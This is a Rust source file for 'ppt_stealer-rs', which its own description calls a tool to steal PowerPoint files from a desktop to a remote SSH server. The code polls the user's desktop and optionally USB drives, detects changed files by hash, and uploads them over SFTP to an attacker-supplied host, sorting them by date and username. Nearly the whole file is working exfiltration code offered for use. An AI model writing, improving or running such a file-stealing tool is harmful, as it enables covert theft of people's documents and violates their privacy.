use chrono::Local;
use clap::{Parser, ArgGroup};
use connection_tools::SshSessionGuard;
use log;
use env_logger;
use ssh2::Session;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::{fs, io};
use std::net::TcpStream;
use std::thread::sleep;
use std::time::Duration;
use std::{self, str::FromStr};
use std::path::{PathBuf, Path};
use sysinfo::{Disk, System};

mod watch_dog;
mod connection_tools;

#[derive(Parser, Debug)]
#[command(name = "ppt_stealer-rs", version = "0.2-beta.2")]
#[command(about = "A tool to steal PowerPoint files from desktop to remote SSH server.", long_about = None)]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(false)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long, help = "SSH IP address or domain")]
    ip: Option<String>,

    #[arg(short = 'p', long, help = "SSH IP port")]
    port: Option<i64>,

    #[arg(short = 'u', long, help = "SSH username")]
    username: Option<String>,

    #[arg(short = 'P', long, group = "auth", help = "SSH password")]
    password: Option<String>,

    #[arg(long, default_value_t = false, group = "auth", help = "Use SSH key authentication. If not assigned, password authentication will be used.")]
    key_auth: bool,

    #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
    refresh_interval: u64,

    #[arg(long, default_value_t = false, help = "Assign no GUI mode")]
    no_gui: bool,

    #[arg(long, help = "Scan additional folder for files.")]
    remote_folder_name: Option<String>,

    #[arg(long, help = "Scan USB for files.")]
    usb: bool,

    #[arg(short = 'L', long, help = "Debug level. Choose from trace, debug, info, warn and error", default_value = "warn")]
    debug_level: String,
}


fn main() {

    
    // Parse command line arguments
    let args = Cli::parse();

    // set debug level
    std::env::set_var("RUST_LOG", &args.debug_level);
    env_logger::init();

    // Set up logging
    // print name and version
    log::info!("ppt_stealer-rs v0.2");
    // print args
    log::info!("Args: {:?}", args);

    // get desktop path
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => {
            // ask user for desktop path
            let mut path = String::new();
            std::io::stdin().read_line(&mut path).expect("Failed to read line");
            let path = PathBuf::from_str(path.trim()).unwrap();
            // check if the given desktop path is valid
            match path.is_dir() {
                true => path,
                false => {
                    log::error!("{} is invalid desktop path", path.display());
                    std::process::exit(1);
                }
            }
        }
    };
    log::info!("Desktop path: {}", desktop_path.display());

    println!("Hello, world!");

    if args.no_gui {
        no_gui(&desktop_path, args);
    } else {
        // start GUI
        log::error!("GUI mode is still under development.");
    }
}

fn no_gui(desktop_path: &Path, args: Cli) {
    log::info!("No GUI mode on.");

    let sess: Arc<Mutex<Session>> = Arc::new(Mutex::new(establish_ssh_connection(&args)));

    let _sess_guard = SshSessionGuard{session: &sess};

    // TODO: Have SshSessionGuard replace the mutex.
    // make sure ssh connection closed after Ctrl+C.
    ctrlc::set_handler({
        let sess = Arc::clone(&sess);
        move || {
            log::info!("Ctrl+C detected. Exiting...");
            let sess = sess.lock().unwrap();
            sess.disconnect(None, "CtrlC detected", None).expect("Failed to disconnect from SSH server.");
            log::info!("SSH session closed.");
            std::process::exit(0);
        }
    }).expect("Error setting Ctrl+C handler.");

    log::info!("Start monitering files...");

    let mut file_hashes: HashMap<PathBuf, String> = HashMap::new();

    loop {
        let path_bufs: Vec<PathBuf> = watch_dog::file_moniter(desktop_path);

        // let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();

        let new_file_hashes = watch_dog::get_hashes(&path_bufs);

        let changed_files: Vec<PathBuf> = watch_dog::get_changed_files(&file_hashes, &new_file_hashes);

        if changed_files.len() > 0 {
            log::info!("Changed files detected.");

            log::debug!("Changed files: {:?}", changed_files);

            file_hashes = new_file_hashes;

            // upload_changed_files_deprecated(changed_files.clone(), &args, &sess);

            log::info!("Uploading changed files...");

            let files_and_roots_path = {
                let mut files_and_roots_path: Vec<[&Path; 2]> = vec![];
                for path in changed_files.iter() {
                    let root_path = desktop_path;   // TODO: Make this configurable.
                    files_and_roots_path.push([path, root_path]);
                }
                files_and_roots_path
            };

            upload_files(&files_and_roots_path, &args, &sess);

            log::info!("Upload completed.");

        } else {
            log::info!("No changes detected.");
        }
        
        sleep(Duration::from_secs(args.refresh_interval));
    }
}

fn establish_ssh_connection(args: &Cli) -> Session  {
    log::info!("Connecting to SSH server...");

    let tcp = {
        let ip = args.ip.as_ref().expect("On no GUI mode, SSH IP address is required!");
        let port = args.port.unwrap_or_else(|| 22);

        let addr = format!("{}:{}", ip, port);

        log::info!("Connecting to SSH server: {}", addr);

        match TcpStream::connect(addr) {
            Ok(stream) => stream,
            Err(e) => {
                log::error!("Failed to connect to SSH server: {}", e);
                std::process::exit(1);
            }
        }
    };
    log::info!("Established tcp connection with SSH server.");

    log::info!("Starting SSH session...");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    if args.key_auth {
        let private_key_path = dirs::home_dir().unwrap().join(".ssh/id_rsa");
        log::debug!("Authenticating with rivate key: {}", private_key_path.display());

        sess.userauth_pubkey_file(
            args.username.as_ref().expect("On no GUI mode, SSH username is required!"),
            None,
            &private_key_path,
            None,
        ).expect("Failed to authenticate with SSH key.");
    } else {
        sess.userauth_password(
            args.username.as_ref().expect("On no GUI mode, SSH username is required!"),
            args.password.as_ref().expect("On no GUI mode, SSH password is required!"),
        ).expect("Failed to authenticate with SSH password.");
    }
    assert!(sess.authenticated());
    log::info!("SSH Authentication successful.");

    sess
}

/**
    This is a new implementation of `upload_changed_files_deprecated`.  
    Not only is it able to upload the files to `YYYY-MM-DD/args.remote_folder_name` or `YYYY-MM-DD/$USERNAME`,  
    but it also keep the relative path of the files to desktop_path, USB drive root, etc.

    ## Args
    ### changed_files:
    It is a reference to a vector of tuples, where each tuple contains two elements:  
    - The first element is the &Path of the file on the local machine.
    - The second is the path of the root folder, by which a relative path is calculated.
    With the relative path, a directory is created on the remote machine,
    and the file is uploaded to that directory.
    ### args: 
    The arguments passed to the program.
    ### sess: 
    The SSH session.
 */
fn upload_files(files_and_roots_path: &[[&Path; 2]], args: &Cli, sess: &Arc<Mutex<Session>>) {

    // establish sftp session
    let sftp = {
        let sess = sess.lock().unwrap();
        sess.sftp().unwrap()
    };
    log::info!("SFTP session established.");

    // create a remote folder for this computer and the date.
    let remote_folder_name = {
        let formatted_date = Local::now().format("%Y-%m-%d").to_string();

        let computer_identifier = match args.remote_folder_name.as_ref() {
            Some(name) => name.to_string(),
            None => {
                let home_dir = dirs::home_dir().unwrap();
                home_dir.file_name().unwrap().to_str().unwrap().to_string()
            }
        };

        let remote_folder_name = format!("{}/{}", formatted_date, computer_identifier);
        log::debug!("Remote folder name for this computer defined as: {remote_folder_name}");

        // check if the remote folder exists. If not, create it.
        {
            let remote_folder_exists = sftp.stat(Path::new(&formatted_date)).is_ok();
            
            if !remote_folder_exists {
                log::debug!("Remote folder '{}' does not exist, creating it.", &formatted_date);
                // 创建远程文件夹
                sftp.mkdir(Path::new(&formatted_date), 0o755).expect("Failed to create remote folder.");
            } else {
                log::debug!("Remote folder '{}' already exists.", &formatted_date);
            }
    
            let remote_folder_exists = sftp.stat(Path::new(&remote_folder_name)).is_ok();
            if !remote_folder_exists {
                log::debug!("Remote folder '{}' does not exist, creating it.", &remote_folder_name);
                // 创建远程文件夹
                sftp.mkdir(Path::new(&remote_folder_name), 0o755).expect("Failed to create remote folder.");
            } else {
                log::debug!("Remote folder '{}' already exists.", &remote_folder_name);
            }
        }

        remote_folder_name
    };

    // TODO: get relative path of files, create corresponding folders on the remote machine, and upload files.
    for [file_path, root_path] in files_and_roots_path.iter() {
        let relative_path = file_path.strip_prefix(root_path).expect("Failed to strip prefix.");

        let remote_path_string = format!("{}/{}", remote_folder_name, relative_path.to_str().unwrap());
        let remote_path = Path::new(&remote_path_string);

        log::info!("Uploading file: {} to remote folder: {}", relative_path.display(), remote_path.display());

        // check if the remote folder exists. If not, create it.
        {
            let mut temp_path = remote_path.parent().unwrap();
            if sftp.stat(temp_path).is_ok() {
                log::debug!("Remote folder '{}' already exists.", temp_path.display());
            } else {
                loop {
                    if sftp.stat(remote_path.parent().unwrap()).is_ok() {
                        log::debug!("Remote folder '{}' already exists.", temp_path.display());
                        break;
                    }
                    loop {
                        let parent_folder = temp_path.parent().unwrap();
                    if sftp.stat(parent_folder).is_ok() {
                        log::debug!("Remote folder '{}' already exists.", parent_folder.display());
                        sftp.mkdir(temp_path, 0o755).expect("Failed to create remote folder.");
                        log::debug!("Remote folder '{}' created.", temp_path.display());
                        break;
                    } else {
                        log::debug!("Remote folder '{}' does not exist.", parent_folder.display());
                        temp_path = parent_folder;
                    }
                    }
                    
                }
            }
        }

        // upload file
        log::info!("Uploading {} to {}", file_path.display(), remote_path.display());

        // open local file
        log::trace!("Opening local file {}", file_path.display());
        let mut local_file = fs::File::open(file_path).expect("Failed to open local file.");

        // open remote file
        log::trace!("Opening remote file {}", remote_path.display());
        let mut remote_file = sftp.create(remote_path).expect("Failed to create remote file.");
        
        io::copy(&mut local_file, &mut remote_file).expect("Failed to copy file.");

        log::info!("Uploaded {} to {}", file_path.display(), remote_path.display());

    }
    log::info!("Finished uploading files.");
}

/// ### This function is deprecated.  
/// A new function will replace this, which is able to keep the relative path of the files.  
/// Upload changed files through SFTP.  
/// determine remote folder name where the files will be uploaded.  
/// The remote folder name is {YYYY-MM-DD/args.remote_folder_name} if args.remote_folder_name is Some(),  
/// otherwise it is {YYYY-MM-DD/$USERNAME}.
fn upload_changed_files_deprecated(changed_files: Vec<PathBuf>, args: &Cli, sess: &Arc<Mutex<Session>>) {

    let formatted_date = Local::now().format("%Y-%m-%d").to_string();

    let remote_folder_name = {

        let computer_identifier = match args.remote_folder_name.as_ref() {
            Some(name) => name.to_string(),
            None => {
                let home_dir = dirs::home_dir().unwrap();
                home_dir.file_name().unwrap().to_str().unwrap().to_string()
            }
        };

        format!("{}/{}", formatted_date, computer_identifier)
    };

    log::info!("Uploading changed files to {}", remote_folder_name);

    // establish sftp session
    let sftp = {
        let sess = sess.lock().unwrap();
        sess.sftp().unwrap()
    };
    log::info!("SFTP session established.");

    // 检查远程文件夹是否存在
    {
        let remote_folder_exists = sftp.stat(Path::new(&formatted_date)).is_ok();
        
        if !remote_folder_exists {
            log::debug!("Remote folder '{}' does not exist, creating it.", &formatted_date);
            // 创建远程文件夹
            sftp.mkdir(Path::new(&formatted_date), 0o755).expect("Failed to create remote folder.");
        } else {
            log::debug!("Remote folder '{}' already exists.", &formatted_date);
        }

        let remote_folder_exists = sftp.stat(Path::new(&remote_folder_name)).is_ok();
        if !remote_folder_exists {
            log::debug!("Remote folder '{}' does not exist, creating it.", &remote_folder_name);
            // 创建远程文件夹
            sftp.mkdir(Path::new(&remote_folder_name), 0o755).expect("Failed to create remote folder.");
        } else {
            log::debug!("Remote folder '{}' already exists.", &remote_folder_name);
        }
    }
    

    // upload changed files to the assigned folder.
    for file in changed_files {
        log::info!("Uploading {}", file.to_str().unwrap());

        // open local file
        let mut local_file = fs::File::open(&file).expect("Failed to open local file.");

        // check if remote file exists. If so, remove it.
        let remote_file_path = format!("{}/{}", remote_folder_name, file.file_name().unwrap().to_str().unwrap());
        let remote_file_exists = sftp.stat(Path::new(&remote_file_path)).is_ok();
        if remote_file_exists {
            log::debug!("Remote file '{}' already exists, removing it.", &remote_file_path);
            sftp.unlink(Path::new(&remote_file_path)).expect("Failed to remove remote file.");
        }

        // create remote file
        let mut remote_file = sftp.create(Path::new(&remote_file_path)).expect("Failed to create remote file.");

        // copy local file to remote server
        io::copy(&mut local_file, &mut remote_file).expect("Failed to copy file.");

        log::info!("{} uploaded.", file.display());
    }
    log::info!("Finished uploading files.");
}
